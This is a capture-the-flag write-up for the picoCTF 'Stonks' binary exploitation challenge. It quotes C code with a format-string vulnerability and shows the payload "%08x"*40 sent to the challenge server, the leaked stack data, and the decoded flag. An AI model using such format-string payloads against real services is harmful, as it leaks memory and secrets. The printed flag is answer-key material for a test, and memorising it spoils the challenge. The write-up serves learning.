#Category: Binary Exploitation

##Stonks
Points: 20

The source code takes us through creating an imaginary stock trading network client. The part that interests us is the function `buy_stonks`, which loads the flag into a char_array and then printf our API token input:

~~~~~~c
	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);
~~~~~~

This printf call is vulnerable to a format string epxloit, and so we can simply print out values on the stack and see if we can locate the flag string.

Following a guide on pwntools, I was able to create a Python program that sends "%08x"*40 to the server as the API key and then print out the output. The padding parameter '08' is particularly important to get a nicely-formatted hex string.
~~~~~
[+] Opening connection to mercury.picoctf.net on port 6989: Done
[*] Viewing Portfolio...
[*] Sending Format String..
%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
[*] Received data:
081e83f00804b000080489c3f7ecbd80ffffffff00000001081e6160f7ed9110f7ecbdc700000000081e718000000002081e83d0081e83f06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3538613032356533ffb4007df7f06af8f7ed9440fc411e000000000100000000f7d68be9f7eda0c0f7ecb5c0f7ecb000ffb4f018f7d5958df7ecb5c008048ecaffb4f02400000000f7eedf09

[*] Closed connection to mercury.picoctf.net port 6989
~~~~~~~

When we try to decode this hex string, we notice that the endianess causes a group of every 4 characters to be swapped. We can use CyberChef to swap the endianess and decode the string:

~~~~
Output: ð....°..Ã....½ì÷ÿÿÿÿ....`a....í÷Ç½ì÷.....q......Ð...ð...picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}.´ÿøjð÷@.í÷..Aü........é.Ö÷À í÷Àµì÷.°ì÷.ð´ÿ..Õ÷Àµì÷Ê...$ð´ÿ....	ßî÷
~~~~
flag: picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}